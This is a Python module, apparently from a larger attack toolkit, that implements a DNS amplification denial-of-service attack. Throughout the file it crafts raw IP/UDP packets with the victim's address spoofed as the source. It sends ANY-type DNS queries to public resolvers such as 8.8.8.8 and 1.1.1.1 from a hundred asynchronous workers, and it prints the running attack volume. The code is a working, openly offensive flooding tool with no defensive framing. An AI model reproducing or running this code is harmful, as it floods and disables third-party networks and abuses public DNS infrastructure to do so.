# layers/amplification/dns_amp.py
import socket
import asyncio
import random
import struct
import time
import os
from typing import List
from colorama import Fore, Style

ROOT_DIR = os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))


class DNSAmplifier:
    """DNS Amplification атака (асинхронные отправки)"""
    
    def __init__(self, target_ip: str, amplification_factor: int = 50, workers: int = 100):
        self.target_ip = target_ip
        self.amplification_factor = amplification_factor
        self.workers = workers
        
        self.sent_queries = 0
        self.estimated_amplified = 0
        self._running = False
        self._tasks = []
        
        self.available_servers = self._load_dns_servers()
        self.large_domains = self._load_large_domains()
    
    def _load_dns_servers(self) -> List[str]:
        server_file = os.path.join(ROOT_DIR, "wordlists", "dns_servers.txt")
        try:
            with open(server_file, 'r') as f:
                servers = [line.strip() for line in f if line.strip()]
                if servers:
                    return servers
        except Exception as e:
            print(f"{Fore.YELLOW}⚠️  Failed to load DNS servers: {e}{Style.RESET_ALL}")
        return ['8.8.8.8', '8.8.4.4', '1.1.1.1']

    def _load_large_domains(self) -> List[str]:
        domains_file = os.path.join(ROOT_DIR, "wordlists", "large_domains.txt")
        try:
            with open(domains_file, 'r') as f:
                domains = [line.strip() for line in f if line.strip()]
                if domains:
                    return domains
        except Exception as e:
            print(f"{Fore.YELLOW}⚠️  Failed to load large domains: {e}{Style.RESET_ALL}")
        return ['ripe.net', 'isc.org', 'arin.net']
    
    def craft_dns_query(self, domain: str, query_type: int = 255) -> bytes:
        transaction_id = random.randint(0, 65535)
        flags = 0x0100
        questions = 1
        answers = 0
        authority = 0
        additional = 0
        
        header = struct.pack('!HHHHHH',
            transaction_id,
            flags,
            questions,
            answers,
            authority,
            additional
        )
        
        qname_parts = []
        for part in domain.encode().split(b'.'):
            qname_parts.append(bytes([len(part)]) + part)
        qname_parts.append(b'\x00')
        qname = b''.join(qname_parts)
        
        qtype = query_type
        qclass = 1
        question = qname + struct.pack('!HH', qtype, qclass)
        
        return header + question
    
    def get_spoofed_socket(self) -> socket.socket:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
            sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
            return sock
        except:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            return sock
    
    def craft_spoofed_packet(self, dns_query: bytes, source_port: int) -> bytes:
        ip_ver = 4
        ip_ihl = 5
        ip_tos = 0
        ip_tot_len = 20 + 8 + len(dns_query)
        ip_id = random.randint(0, 65535)
        ip_frag_off = 0
        ip_ttl = 255
        ip_proto = socket.IPPROTO_UDP
        ip_check = 0
        ip_saddr = socket.inet_aton(self.target_ip)
        ip_daddr = socket.inet_aton(random.choice(self.available_servers))
        
        ip_header = struct.pack('!BBHHHBBH4s4s',
            (ip_ver << 4) + ip_ihl,
            ip_tos,
            ip_tot_len,
            ip_id,
            ip_frag_off,
            ip_ttl,
            ip_proto,
            ip_check,
            ip_saddr,
            ip_daddr
        )
        
        udp_src = source_port
        udp_dst = 53
        udp_len = 8 + len(dns_query)
        udp_check = 0
        
        udp_header = struct.pack('!HHHH',
            udp_src,
            udp_dst,
            udp_len,
            udp_check
        )
        
        return ip_header + udp_header + dns_query
    
    async def amplification_worker(self, worker_id: int):
        sock = None
        loop = asyncio.get_running_loop()
        
        try:
            try:
                sock = self.get_spoofed_socket()
                use_spoofing = True
                # Делаем сокет неблокирующим для использования с loop.sock_sendto
                sock.setblocking(False)
            except PermissionError:
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                sock.setblocking(False)
                use_spoofing = False
                print(f"{Fore.YELLOW}⚠️  Worker {worker_id}: Running without IP spoofing (need root){Style.RESET_ALL}")
            
            source_port = random.randint(1024, 65535)
            
            while self._running:
                try:
                    dns_server = random.choice(self.available_servers)
                    domain = random.choice(self.large_domains)
                    dns_query = self.craft_dns_query(domain)
                    
                    if use_spoofing:
                        packet = self.craft_spoofed_packet(dns_query, source_port)
                        # Асинхронная отправка raw пакета
                        await loop.sock_sendto(sock, packet, (dns_server, 53))
                    else:
                        # Асинхронная отправка UDP
                        await loop.sock_sendto(sock, dns_query, (dns_server, 53))
                    
                    self.sent_queries += 1
                    self.estimated_amplified += self.amplification_factor
                    
                    if self.sent_queries % 100 == 0:
                        elapsed = time.time() - getattr(self, '_start_time', time.time())
                        qps = int(self.sent_queries / elapsed) if elapsed > 0 else 0
                        estimated_mbps = (self.estimated_amplified * 512) / 1024 / 1024
                        
                        print(f"\r{Fore.WHITE}🌀 Queries: {self.sent_queries:,} | "
                              f"⚡ QPS: {qps:,} | "
                              f"📈 Est. Amplified: {self.estimated_amplified:,} packets | "
                              f"💾 ~{estimated_mbps:.1f} MB{Style.RESET_ALL}", end="")
                    
                    # Небольшая задержка
                    await asyncio.sleep(0.01)
                    
                except (BlockingIOError, socket.error):
                    await asyncio.sleep(0.001)
                    continue
                except Exception as e:
                    if self._running:
                        print(f"{Fore.RED}[DNS Worker {worker_id}] Error: {e}{Style.RESET_ALL}")
                    await asyncio.sleep(0.1)
        
        except Exception as e:
            print(f"{Fore.RED}❌ DNS Worker {worker_id} failed: {e}{Style.RESET_ALL}")
        finally:
            if sock:
                try:
                    sock.close()
                except:
                    pass
    
    async def start(self):
        self._running = True
        self._start_time = time.time()
        
        print(f"{Fore.CYAN}🚀 Starting DNS Amplification attack{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}⚠️  Note: IP spoofing requires root/admin privileges{Style.RESET_ALL}")
        print(f"{Fore.CYAN}🎯 Target: {self.target_ip}{Style.RESET_ALL}")
        print(f"{Fore.CYAN}📊 Amplification factor: ~{self.amplification_factor}x{Style.RESET_ALL}")
        
        self._tasks = []
        for i in range(self.workers):
            task = asyncio.create_task(self.amplification_worker(i))
            self._tasks.append(task)
        
        try:
            await asyncio.gather(*self._tasks)
        except asyncio.CancelledError:
            pass
    
    def stop(self):
        self._running = False
        for task in self._tasks:
            task.cancel()
        
        print(f"\n{Fore.GREEN}✅ DNS Amplification stopped{Style.RESET_ALL}")
        print(f"📊 Queries sent: {self.sent_queries:,}")
        print(f"📈 Estimated amplified traffic: {self.estimated_amplified:,} packets")
        
        if self.sent_queries > 0:
            amplification_ratio = self.estimated_amplified / self.sent_queries
            print(f"🎯 Actual amplification: ~{amplification_ratio:.1f}x")